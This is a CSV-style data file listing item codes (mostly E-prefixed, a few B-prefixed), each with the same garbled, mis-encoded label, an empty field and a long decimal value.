' ½­Òõ¿â´æ,E2196,"",0.62600000000000000089
' ½­Òõ¿â´æ,E2197,"",1.18599999999999994316
' ½­Òõ¿â´æ,E2198,"",0.74199999999999999289
' ½­Òõ¿â´æ,E2199,"",1.47399999999999997691
' ½­Òõ¿â´æ,E2200,"",0.85399999999999998135
' ½­Òõ¿â´æ,E2202,"",3.46200000000000018829
' ½­Òõ¿â´æ,E2203,"",1.07200000000000006395
' ½­Òõ¿â´æ,E2205,"",5.75600000000000022737
' ½­Òõ¿â´æ,E2206,"",2.90099999999999980105
' ½­Òõ¿â´æ,E2207,"",2.70599999999999996092
' ½­Òõ¿â´æ,E2209,"",3.74100000000000010303
' ½­Òõ¿â´æ,E2210,"",3.37400000000000011013
' ½­Òõ¿â´æ,E2211,"",0.64600000000000001865
' ½­Òõ¿â´æ,E2212,"",0.52200000000000001954
' ½­Òõ¿â´æ,E2214,"",0.30299999999999999156
' ½­Òõ¿â´æ,E2215,"",1.26400000000000001243
' ½­Òõ¿â´æ,E2216,"",1.14300000000000001599
' ½­Òõ¿â´æ,E2217,"",0.67800000000000004707
' ½­Òõ¿â´æ,E2218,"",1.98799999999999998934
' ½­Òõ¿â´æ,B2220,"",8.30000000000000071054
' ½­Òõ¿â´æ,E2220,"",1.17300000000000004263
' ½­Òõ¿â´æ,E2222,"",3.86299999999999998934
' ½­Òõ¿â´æ,E2223,"",1.17799999999999993605
' ½­Òõ¿â´æ,E2224,"",1.29699999999999993072
' ½­Òõ¿â´æ,E2225,"",1.73900000000000010125
' ½­Òõ¿â´æ,E2226,"",1.17900000000000004796
' ½­Òõ¿â´æ,E2227,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2228,"",1.20399999999999995914
' ½­Òõ¿â´æ,E2229,"",0.65900000000000003020
' ½­Òõ¿â´æ,E2230,"",5.72799999999999975842
' ½­Òõ¿â´æ,E2231,"",0.89400000000000001688
' ½­Òõ¿â´æ,E2232,"",1.63900000000000001243
' ½­Òõ¿â´æ,E2235,"",0.62600000000000000089
' ½­Òõ¿â´æ,E2236,"",0.64600000000000001865
' ½­Òõ¿â´æ,E2237,"",2.46300000000000007816
' ½­Òõ¿â´æ,E2239,"",3.68400000000000016342
' ½­Òõ¿â´æ,E2240,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2241,"",0.69899999999999995470
' ½­Òõ¿â´æ,E2242,"",1.83400000000000007461
' ½­Òõ¿â´æ,E2243,"",1.88300000000000000711
' ½­Òõ¿â´æ,E2245,"",0.74699999999999999734
' ½­Òõ¿â´æ,E2246,"",5.48700000000000009948
' ½­Òõ¿â´æ,E2247,"",0.42699999999999999067
' ½­Òõ¿â´æ,E2249,"",1.33200000000000007283
' ½­Òõ¿â´æ,E2250,"",0.56000000000000005329
' ½­Òõ¿â´æ,E2251,"",2.84900000000000019895
' ½­Òõ¿â´æ,E2252,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2253,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2254,"",12.56099999999999994316
' ½­Òõ¿â´æ,E2255,"",3.86299999999999998934
' ½­Òõ¿â´æ,E2256,"",0.52800000000000002487
' ½­Òõ¿â´æ,E2258,"",0.41399999999999997913
' ½­Òõ¿â´æ,E2259,"",2.75099999999999988987
' ½­Òõ¿â´æ,E2260,"",0.69199999999999994849
' ½­Òõ¿â´æ,E2261,"",0.56599999999999994760
' ½­Òõ¿â´æ,E2262,"",0.86199999999999998845
' ½­Òõ¿â´æ,E2263,"",2.47100000000000008527
' ½­Òõ¿â´æ,E2264,"",3.86299999999999998934
' ½­Òõ¿â´æ,E2265,"",1.56400000000000005684
' ½­Òõ¿â´æ,E2266,"",3.86299999999999998934
' ½­Òõ¿â´æ,E2267,"",5.91899999999999959499
' ½­Òõ¿â´æ,E2268,"",3.52599999999999980105
' ½­Òõ¿â´æ,E2270,"",1.33200000000000007283
' ½­Òõ¿â´æ,E2271,"",0.56499999999999994671
' ½­Òõ¿â´æ,E2272,"",1.10299999999999998046
' ½­Òõ¿â´æ,E2273,"",0.47899999999999998135
' ½­Òõ¿â´æ,E2274,"",2.42899999999999982592
' ½­Òõ¿â´æ,E2275,"",0.85699999999999998401
' ½­Òõ¿â´æ,E2279,"",0.80800000000000005151
' ½­Òõ¿â´æ,E2280,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2281,"",1.61299999999999998934
' ½­Òõ¿â´æ,B2282,"",9.52999999999999936051
' ½­Òõ¿â´æ,E2283,"",0.84199999999999997069
' ½­Òõ¿â´æ,E2284,"",0.37700000000000000178
' ½­Òõ¿â´æ,E2285,"",1.28099999999999991651
' ½­Òõ¿â´æ,E2286,"",1.73900000000000010125
' ½­Òõ¿â´æ,E2287,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2288,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2289,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2290,"",0.56499999999999994671
' ½­Òõ¿â´æ,E2291,"",3.68400000000000016342
' ½­Òõ¿â´æ,E2292,"",1.89799999999999990941
' ½­Òõ¿â´æ,E2293,"",1.73900000000000010125
' ½­Òõ¿â´æ,E2294,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2295,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2296,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2297,"",4.79699999999999970868
' ½­Òõ¿â´æ,E2298,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2299,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2300,"",3.82699999999999995737
' ½­Òõ¿â´æ,E2301,"",2.74800000000000022027
' ½­Òõ¿â´æ,B2302,"",9.52999999999999936051
' ½­Òõ¿â´æ,E2304,"",2.37900000000000000355
' ½­Òõ¿â´æ,E2305,"",0.66400000000000003464
' ½­Òõ¿â´æ,E2306,"",0.45700000000000001732
' ½­Òõ¿â´æ,E2307,"",0.77400000000000002132
' ½­Òõ¿â´æ,E2308,"",1.97100000000000008527
' ½­Òõ¿â´æ,E2310,"",0.37700000000000000178
' ½­Òõ¿â´æ,E2311,"",5.47200000000000041922
' ½­Òõ¿â´æ,E2312,"",1.45100000000000006750
' ½­Òõ¿â´æ,E2313,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2314,"",3.71099999999999985434
' ½­Òõ¿â´æ,E2315,"",1.17199999999999993072
' ½­Òõ¿â´æ,E2316,"",2.51299999999999990052
' ½­Òõ¿â´æ,E2317,"",2.48200000000000020606
' ½­Òõ¿â´æ,E2318,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2319,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2320,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2321,"",5.87199999999999988631
' ½­Òõ¿â´æ,E2322,"",0.84299999999999997158
' ½­Òõ¿â´æ,B2323,"",18.39999999999999857891
' ½­Òõ¿â´æ,E2323,"",5.28699999999999992184
' ½­Òõ¿â´æ,E2325,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2328,"",0.87600000000000000089
' ½­Òõ¿â´æ,E2329,"",0.51200000000000001066
' ½­Òõ¿â´æ,E2330,"",0.41599999999999998090
' ½­Òõ¿â´æ,E2332,"",0.76200000000000001066
' ½­Òõ¿â´æ,E2333,"",0.50600000000000000533
' ½­Òõ¿â´æ,E2334,"",0.95399999999999995914
' ½­Òõ¿â´æ,E2335,"",0.66400000000000003464
' ½­Òõ¿â´æ,E2336,"",0.50100000000000000089
' ½­Òõ¿â´æ,E2337,"",0.82799999999999995826
' ½­Òõ¿â´æ,E2338,"",4.54800000000000004263
' ½­Òõ¿â´æ,E2339,"",0.83299999999999996270
' ½­Òõ¿â´æ,E2340,"",0.95799999999999996270
' ½­Òõ¿â´æ,E2341,"",0.64100000000000001421
' ½­Òõ¿â´æ,E2342,"",1.25299999999999989164
' ½­Òõ¿â´æ,E2343,"",1.40399999999999991473
' ½­Òõ¿â´æ,E2344,"",3.17799999999999993605
' ½­Òõ¿â´æ,E2345,"",1.73900000000000010125
' ½­Òõ¿â´æ,E2346,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2347,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2348,"",1.87799999999999989164
' ½­Òõ¿â´æ,E2349,"",0.79100000000000003642
' ½­Òõ¿â´æ,E2350,"",0.79700000000000004174
' ½­Òõ¿â´æ,E2351,"",3.86299999999999998934
' ½­Òõ¿â´æ,E2352,"",0.66100000000000003197
' ½­Òõ¿â´æ,E2353,"",1.53099999999999991651
' ½­Òõ¿â´æ,E2354,"",0.83099999999999996092
' ½­Òõ¿â´æ,E2355,"",0.89900000000000002132
' ½­Òõ¿â´æ,E2356,"",0.54600000000000004086
' ½­Òõ¿â´æ,E2357,"",0.57699999999999995737
' ½­Òõ¿â´æ,E2358,"",1.14999999999999991118
' ½­Òõ¿â´æ,E2360,"",2.04899999999999993250
' ½­Òõ¿â´æ,B2361,"",18.39999999999999857891
' ½­Òõ¿â´æ,E2361,"",5.28699999999999992184
' ½­Òõ¿â´æ,E2362,"",3.83700000000000018829
' ½­Òõ¿â´æ,E2363,"",0.65900000000000003020
' ½­Òõ¿â´æ,E2364,"",1.70399999999999995914
' ½­Òõ¿â´æ,E2365,"",0.58399999999999996358
' ½­Òõ¿â´æ,E2366,"",0.58399999999999996358
' ½­Òõ¿â´æ,E2367,"",0.56399999999999994582
' ½­Òõ¿â´æ,E2368,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2369,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2370,"",3.67399999999999993250
' ½­Òõ¿â´æ,E2371,"",1.69599999999999995204
' ½­Òõ¿â´æ,E2372,"",1.88399999999999989697
' ½­Òõ¿â´æ,E2373,"",2.61600000000000010303
' ½­Òõ¿â´æ,E2374,"",2.73200000000000020606
' ½­Òõ¿â´æ,E2375,"",1.08600000000000007638
' ½­Òõ¿â´æ,E2376,"",0.52800000000000002487
' ½­Òõ¿â´æ,E2377,"",0.79200000000000003730
' ½­Òõ¿â´æ,E2378,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2379,"",0.64100000000000001421
' ½­Òõ¿â´æ,E2380,"",0.84799999999999997602
' ½­Òõ¿â´æ,E2381,"",0.80100000000000004530
' ½­Òõ¿â´æ,E2382,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2383,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2384,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2385,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2386,"",5.39299999999999979394
' ½­Òõ¿â´æ,E2387,"",2.21799999999999997158
' ½­Òõ¿â´æ,E2388,"",3.07699999999999995737
' ½­Òõ¿â´æ,E2389,"",2.24400000000000021672
' ½­Òõ¿â´æ,E2390,"",0.86199999999999998845
' ½­Òõ¿â´æ,E2391,"",1.05800000000000005151
' ½­Òõ¿â´æ,E2392,"",0.86099999999999998757
' ½­Òõ¿â´æ,E2393,"",1.05800000000000005151
' ½­Òõ¿â´æ,E2394,"",0.86099999999999998757
' ½­Òõ¿â´æ,E2395,"",0.55400000000000004796
' ½­Òõ¿â´æ,E2396,"",0.75600000000000000533
' ½­Òõ¿â´æ,E2397,"",0.58199999999999996181
' ½­Òõ¿â´æ,E2398,"",0.50200000000000000178
' ½­Òõ¿â´æ,B2399,"",8.30000000000000071054
' ½­Òõ¿â´æ,E2399,"",1.46599999999999996980
' ½­Òõ¿â´æ,E2400,"",0.89200000000000001510
' ½­Òõ¿â´æ,E2401,"",0.98199999999999998401
' ½­Òõ¿â´æ,E2402,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2403,"",0.80300000000000004707
' ½­Òõ¿â´æ,E2405,"",0.91700000000000003730
' ½­Òõ¿â´æ,E2406,"",0.90700000000000002842
' ½­Òõ¿â´æ,E2407,"",0.73099999999999998312
' ½­Òõ¿â´æ,E2408,"",0.70299999999999995826
' ½­Òõ¿â´æ,E2409,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2410,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2411,"",1.18700000000000005507
' ½­Òõ¿â´æ,E2412,"",0.82899999999999995914
' ½­Òõ¿â´æ,E2413,"",0.96899999999999997247
' ½­Òõ¿â´æ,E2414,"",0.61099999999999998757
' ½­Òõ¿â´æ,E2416,"",1.35400000000000009237
' ½­Òõ¿â´æ,E2417,"",2.27899999999999991473
' ½­Òõ¿â´æ,E2418,"",0.76900000000000001688
' ½­Òõ¿â´æ,B2419,"",18.39999999999999857891
' ½­Òõ¿â´æ,E2419,"",5.28699999999999992184
' ½­Òõ¿â´æ,E2421,"",4.50399999999999955946
' ½­Òõ¿â´æ,E2422,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2423,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2424,"",1.24799999999999999822
' ½­Òõ¿â´æ,E2425,"",0.60199999999999997957
' ½­Òõ¿â´æ,E2426,"",5.53899999999999970157
' ½­Òõ¿â´æ,E2427,"",1.85299999999999998046
' ½­Òõ¿â´æ,E2428,"",2.26900000000000012790
' ½­Òõ¿â´æ,E2429,"",1.03600000000000003197
' ½­Òõ¿â´æ,E2431,"",0.94199999999999994849
' ½­Òõ¿â´æ,E2432,"",1.07699999999999995737
' ½­Òõ¿â´æ,E2433,"",0.34899999999999997691
' ½­Òõ¿â´æ,E2434,"",2.61600000000000010303
' ½­Òõ¿â´æ,E2435,"",2.28200000000000002842
' ½­Òõ¿â´æ,E2436,"",3.69799999999999995381
' ½­Òõ¿â´æ,E2437,"",1.20599999999999996092
' ½­Òõ¿â´æ,E2438,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2440,"",0.94199999999999994849
' ½­Òõ¿â´æ,E2441,"",1.05800000000000005151
' ½­Òõ¿â´æ,E2442,"",1.30200000000000004619
' ½­Òõ¿â´æ,E2445,"",3.68400000000000016342
' ½­Òõ¿â´æ,E2446,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2447,"",0.90700000000000002842
' ½­Òõ¿â´æ,E2448,"",0.55400000000000004796
' ½­Òõ¿â´æ,E2449,"",0.87700000000000000178
' ½­Òõ¿â´æ,E2450,"",1.88399999999999989697
' ½­Òõ¿â´æ,E2451,"",1.88399999999999989697
' ½­Òõ¿â´æ,E2452,"",1.88399999999999989697
' ½­Òõ¿â´æ,E2454,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2456,"",5.22200000000000041922
' ½­Òõ¿â´æ,E2457,"",1.73900000000000010125
' ½­Òõ¿â´æ,E2458,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2459,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2460,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2461,"",2.27199999999999979750
' ½­Òõ¿â´æ,E2462,"",0.71399999999999996803
' ½­Òõ¿â´æ,E2463,"",9.47899999999999920419
' ½­Òõ¿â´æ,E2464,"",0.66800000000000003819
' ½­Òõ¿â´æ,E2465,"",0.60399999999999998135
' ½­Òõ¿â´æ,E2466,"",8.32499999999999928946
' ½­Òõ¿â´æ,E2467,"",3.93800000000000016698
' ½­Òõ¿â´æ,E2468,"",2.61600000000000010303
' ½­Òõ¿â´æ,E2469,"",1.39599999999999990763
' ½­Òõ¿â´æ,E2470,"",1.07299999999999995381
' ½­Òõ¿â´æ,E2471,"",0.73399999999999998579
' ½­Òõ¿â´æ,E2472,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2473,"",1.73900000000000010125
' ½­Òõ¿â´æ,E2474,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2475,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2476,"",1.81299999999999994493
' ½­Òõ¿â´æ,E2477,"",5.87199999999999988631
' ½­Òõ¿â´æ,E2480,"",3.97199999999999997513
' ½­Òõ¿â´æ,E2481,"",3.28100000000000013856
' ½­Òõ¿â´æ,E2482,"",0.88400000000000000799
' ½­Òõ¿â´æ,E2483,"",0.90700000000000002842
' ½­Òõ¿â´æ,E2484,"",1.21399999999999996803
' ½­Òõ¿â´æ,E2485,"",5.30799999999999982947
' ½­Òõ¿â´æ,E2486,"",0.62800000000000000266
' ½­Òõ¿â´æ,E2487,"",1.83699999999999996625
' ½­Òõ¿â´æ,E2489,"",2.99599999999999999645
' ½­Òõ¿â´æ,E2490,"",0.89200000000000001510
' ½­Òõ¿â´æ,E2491,"",2.60800000000000009592
' ½­Òõ¿â´æ,E2492,"",2.11600000000000010303
' ½­Òõ¿â´æ,E2493,"",0.90400000000000002576
' ½­Òõ¿â´æ,E2494,"",0.57099999999999995204
' ½­Òõ¿â´æ,E2495,"",1.70599999999999996092
' ½­Òõ¿â´æ,E2496,"",0.65900000000000003020
' ½­Òõ¿â´æ,E2497,"",1.03400000000000003020
' ½­Òõ¿â´æ,E2499,"",0.93400000000000005240
' ½­Òõ¿â´æ,E2500,"",1.66399999999999992362
' ½­Òõ¿â´æ,E2501,"",0.58699999999999996625
' ½­Òõ¿â´æ,E2502,"",2.29700000000000015277
' ½­Òõ¿â´æ,E2503,"",0.69099999999999994760
' ½­Òõ¿â´æ,E2504,"",0.89200000000000001510
' ½­Òõ¿â´æ,E2505,"",0.53400000000000003020
' ½­Òõ¿â´æ,E2507,"",3.86299999999999998934
' ½­Òõ¿â´æ,E2508,"",0.64100000000000001421
' ½­Òõ¿â´æ,E2509,"",0.64100000000000001421
' ½­Òõ¿â´æ,E2510,"",0.66200000000000003286
' ½­Òõ¿â´æ,E2511,"",0.64100000000000001421
' ½­Òõ¿â´æ,E2512,"",1.30600000000000004974
' ½­Òõ¿â´æ,E2514,"",0.56599999999999994760
' ½­Òõ¿â´æ,E2516,"",0.41399999999999997913
' ½­Òõ¿â´æ,E2518,"",0.53400000000000003020
' ½­Òõ¿â´æ,E2519,"",0.56599999999999994760
' ½­Òõ¿â´æ,E2520,"",1.09400000000000008349
' ½­Òõ¿â´æ,E2521,"",0.84299999999999997158
' ½­Òõ¿â´æ,E2522,"",0.75300000000000000266
' ½­Òõ¿â´æ,E2523,"",1.21799999999999997158
' ½­Òõ¿â´æ,E2524,"",1.96900000000000008349
' ½­Òõ¿â´æ,E2525,"",0.60099999999999997868
' ½­Òõ¿â´æ,B2526,"",9.52999999999999936051
' ½­Òõ¿â´æ,E2526,"",0.91200000000000003286
' ½­Òõ¿â´æ,E2531,"",5.22200000000000041922
' ½­Òõ¿â´æ,E2532,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2533,"",4.79699999999999970868
' ½­Òõ¿â´æ,E2534,"",1.81099999999999994316
' ½­Òõ¿â´æ,E2535,"",1.64700000000000001954
' ½­Òõ¿â´æ,E2536,"",7.24899999999999966604
' ½­Òõ¿â´æ,E2537,"",1.70399999999999995914
' ½­Òõ¿â´æ,E2538,"",5.33800000000000007816
' ½­Òõ¿â´æ,E2539,"",2.33899999999999996803
' ½­Òõ¿â´æ,E2540,"",11.47300000000000075318
' ½­Òõ¿â´æ,E2541,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2542,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2543,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2544,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2545,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2546,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2547,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2548,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2549,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2550,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2551,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2552,"",4.14499999999999957367
' ½­Òõ¿â´æ,E2553,"",7.27899999999999991473
' ½­Òõ¿â´æ,E2554,"",2.94799999999999995381
' ½­Òõ¿â´æ,E2555,"",2.21899999999999986144
' ½­Òõ¿â´æ,B2556,"",9.52999999999999936051
' ½­Òõ¿â´æ,B2557,"",9.52999999999999936051
' ½­Òõ¿â´æ,E2557,"",0.82099999999999995204
' ½­Òõ¿â´æ,E2558,"",3.28900000000000014566
' ½­Òõ¿â´æ,E2559,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2560,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2561,"",8.46700000000000052580
' ½­Òõ¿â´æ,E2563,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2564,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2565,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2566,"",1.63700000000000001066
' ½­Òõ¿â´æ,E2567,"",2.06099999999999994316
' ½­Òõ¿â´æ,E2569,"",5.86599999999999965894
' ½­Òõ¿â´æ,E2571,"",1.28600000000000003197
' ½­Òõ¿â´æ,E2573,"",0.72699999999999997957
' ½­Òõ¿â´æ,E2574,"",0.84899999999999997691
' ½­Òõ¿â´æ,E2575,"",2.69399999999999995026
' ½­Òõ¿â´æ,E2576,"",4.14499999999999957367
' ½­Òõ¿â´æ,E2577,"",2.16699999999999981526
' ½­Òõ¿â´æ,E2578,"",4.14499999999999957367
' ½­Òõ¿â´æ,E2580,"",6.08699999999999974420
' ½­Òõ¿â´æ,E2581,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2582,"",0.87600000000000000089
' ½­Òõ¿â´æ,E2583,"",0.87600000000000000089
' ½­Òõ¿â´æ,E2584,"",1.39100000000000001421
' ½­Òõ¿â´æ,E2585,"",3.32699999999999995737
' ½­Òõ¿â´æ,E2587,"",4.14499999999999957367
' ½­Òõ¿â´æ,E2588,"",4.09299999999999997158
' ½­Òõ¿â´æ,E2589,"",4.07599999999999962341
' ½­Òõ¿â´æ,E2590,"",4.11000000000000031974
' ½­Òõ¿â´æ,E2591,"",3.93800000000000016698
' ½­Òõ¿â´æ,E2592,"",0.53400000000000003020
' ½­Òõ¿â´æ,E2593,"",0.36299999999999998934
' ½­Òõ¿â´æ,E2596,"",0.90700000000000002842
' ½­Òõ¿â´æ,E2597,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2598,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2599,"",0.50200000000000000178
' ½­Òõ¿â´æ,E2602,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2603,"",0.75400000000000000355
' ½­Òõ¿â´æ,E2604,"",2.02199999999999979750
' ½­Òõ¿â´æ,E2605,"",1.20599999999999996092
' ½­Òõ¿â´æ,E2607,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2608,"",1.73900000000000010125
' ½­Òõ¿â´æ,E2609,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2610,"",1.20300000000000006928
' ½­Òõ¿â´æ,E2611,"",0.53700000000000003286
' ½­Òõ¿â´æ,E2612,"",0.84899999999999997691
' ½­Òõ¿â´æ,E2613,"",0.84899999999999997691
' ½­Òõ¿â´æ,E2614,"",1.31600000000000005862
' ½­Òõ¿â´æ,E2615,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2616,"",0.55000000000000004441
' ½­Òõ¿â´æ,E2618,"",0.87700000000000000178
' ½­Òõ¿â´æ,E2619,"",0.76800000000000001599
' ½­Òõ¿â´æ,E2621,"",2.70599999999999996092
' ½­Òõ¿â´æ,E2622,"",2.64699999999999979750
' ½­Òõ¿â´æ,E2623,"",0.87600000000000000089
' ½­Òõ¿â´æ,E2624,"",0.89200000000000001510
' ½­Òõ¿â´æ,E2625,"",8.50300000000000011369
' ½­Òõ¿â´æ,E2626,"",1.25299999999999989164
' ½­Òõ¿â´æ,E2627,"",0.66200000000000003286
' ½­Òõ¿â´æ,E2628,"",0.65100000000000002309
' ½­Òõ¿â´æ,E2629,"",0.84099999999999996980
' ½­Òõ¿â´æ,E2630,"",2.56700000000000017053
' ½­Òõ¿â´æ,E2631,"",0.50200000000000000178
' ½­Òõ¿â´æ,E2633,"",2.28600000000000003197
' ½­Òõ¿â´æ,E2634,"",0.57399999999999995470
' ½­Òõ¿â´æ,E2635,"",1.97599999999999997868
' ½­Òõ¿â´æ,E2636,"",0.99199999999999999289
' ½­Òõ¿â´æ,E2637,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2639,"",2.23300000000000009592
' ½­Òõ¿â´æ,E2640,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2641,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2642,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2643,"",8.35200000000000031264
' ½­Òõ¿â´æ,E2644,"",7.88300000000000000711
' ½­Òõ¿â´æ,E2645,"",7.55100000000000015632
' ½­Òõ¿â´æ,E2647,"",0.92700000000000004619
' ½­Òõ¿â´æ,E2649,"",4.78200000000000002842
' ½­Òõ¿â´æ,E2650,"",0.98899999999999999023
' ½­Òõ¿â´æ,E2652,"",2.17300000000000004263
' ½­Òõ¿â´æ,E2653,"",1.63199999999999989519
' ½­Òõ¿â´æ,E2654,"",9.29800000000000004263
' ½­Òõ¿â´æ,E2655,"",7.12699999999999977973
' ½­Òõ¿â´æ,E2656,"",2.49400000000000021672
' ½­Òõ¿â´æ,E2657,"",0.67700000000000004619
' ½­Òõ¿â´æ,E2658,"",2.39599999999999990763
' ½­Òõ¿â´æ,E2659,"",1.59200000000000008171
' ½­Òõ¿â´æ,E2660,"",4.95899999999999963052
' ½­Òõ¿â´æ,E2661,"",5.58399999999999963052
' ½­Òõ¿â´æ,E2662,"",1.47799999999999998046
' ½­Òõ¿â´æ,E2663,"",2.71600000000000019185
' ½­Òõ¿â´æ,E2664,"",15.51200000000000045475
' ½­Òõ¿â´æ,E2665,"",8.15099999999999980105
' ½­Òõ¿â´æ,E2666,"",7.91300000000000025580
' ½­Òõ¿â´æ,E2667,"",5.14900000000000002132
' ½­Òõ¿â´æ,E2668,"",1.59200000000000008171
' ½­Òõ¿â´æ,E2669,"",1.59200000000000008171
' ½­Òõ¿â´æ,E2670,"",3.58899999999999996803
' ½­Òõ¿â´æ,E2671,"",1.22500000000000008882
' ½­Òõ¿â´æ,E2673,"",1.12999999999999989342
' ½­Òõ¿â´æ,E2674,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2675,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2676,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2677,"",2.80399999999999982592
' ½­Òõ¿â´æ,E2678,"",2.04400000000000003908
' ½­Òõ¿â´æ,E2679,"",3.53299999999999991829
' ½­Òõ¿â´æ,E2681,"",2.43699999999999983302
' ½­Òõ¿â´æ,E2682,"",1.89799999999999990941
' ½­Òõ¿â´æ,E2683,"",1.12999999999999989342
' ½­Òõ¿â´æ,E2684,"",1.59200000000000008171
' ½­Òõ¿â´æ,E2685,"",3.22699999999999986855
' ½­Òõ¿â´æ,E2686,"",0.52800000000000002487
' ½­Òõ¿â´æ,E2688,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2689,"",1.25299999999999989164
' ½­Òõ¿â´æ,E2690,"",1.87799999999999989164
' ½­Òõ¿â´æ,E2691,"",3.77199999999999979750
' ½­Òõ¿â´æ,E2692,"",1.72700000000000009059
' ½­Òõ¿â´æ,E2693,"",0.96699999999999997069
' ½­Òõ¿â´æ,E2694,"",1.71799999999999997158
' ½­Òõ¿â´æ,E2695,"",0.98699999999999998845
' ½­Òõ¿â´æ,E2696,"",0.74699999999999999734
' ½­Òõ¿â´æ,E2697,"",4.47499999999999964473
' ½­Òõ¿â´æ,E2700,"",1.87700000000000000178
' ½­Òõ¿â´æ,E2701,"",1.19399999999999995026
' ½­Òõ¿â´æ,E2703,"",0.52400000000000002132
' ½­Òõ¿â´æ,E2706,"",7.16399999999999970157
' ½­Òõ¿â´æ,E2707,"",1.95599999999999996092
' ½­Òõ¿â´æ,E2708,"",5.12399999999999966604
' ½­Òõ¿â´æ,E2709,"",3.94700000000000006395
' ½­Òõ¿â´æ,E2710,"",0.75400000000000000355
' ½­Òõ¿â´æ,E2711,"",12.88700000000000045475
' ½­Òõ¿â´æ,E2712,"",1.62299999999999999822
' ½­Òõ¿â´æ,E2713,"",2.76799999999999979394
' ½­Òõ¿â´æ,E2714,"",3.39599999999999990763
' ½­Òõ¿â´æ,E2715,"",2.34799999999999986500
' ½­Òõ¿â´æ,E2716,"",5.58399999999999963052
' ½­Òõ¿â´æ,E2717,"",1.77200000000000001954
' ½­Òõ¿â´æ,E2718,"",2.28600000000000003197
' ½­Òõ¿â´æ,E2719,"",1.66199999999999992184
' ½­Òõ¿â´æ,E2720,"",2.43400000000000016342
' ½­Òõ¿â´æ,E2723,"",1.62900000000000000355
' ½­Òõ¿â´æ,E2725,"",0.67800000000000004707
' ½­Òõ¿â´æ,E2726,"",0.98699999999999998845
' ½­Òõ¿â´æ,E2728,"",1.59200000000000008171
' ½­Òõ¿â´æ,E2729,"",5.77700000000000013500
' ½­Òõ¿â´æ,E2730,"",0.79700000000000004174
' ½­Òõ¿â´æ,E2731,"",3.95199999999999995737
' ½­Òõ¿â´æ,E2732,"",2.13600000000000012079
' ½­Òõ¿â´æ,E2734,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2735,"",1.18700000000000005507
' ½­Òõ¿â´æ,E2736,"",2.55799999999999982947
' ½­Òõ¿â´æ,E2737,"",2.81800000000000006040
' ½­Òõ¿â´æ,E2738,"",3.28100000000000013856
' ½­Òõ¿â´æ,E2739,"",7.32099999999999972999
' ½­Òõ¿â´æ,E2740,"",3.81099999999999994316
' ½­Òõ¿â´æ,E2742,"",1.50699999999999989519
' ½­Òõ¿â´æ,E2743,"",0.79700000000000004174
' ½­Òõ¿â´æ,E2744,"",1.30600000000000004974
' ½­Òõ¿â´æ,E2745,"",9.23199999999999931788
' ½­Òõ¿â´æ,E2749,"",5.79199999999999981526
' ½­Òõ¿â´æ,E2751,"",4.08100000000000040501
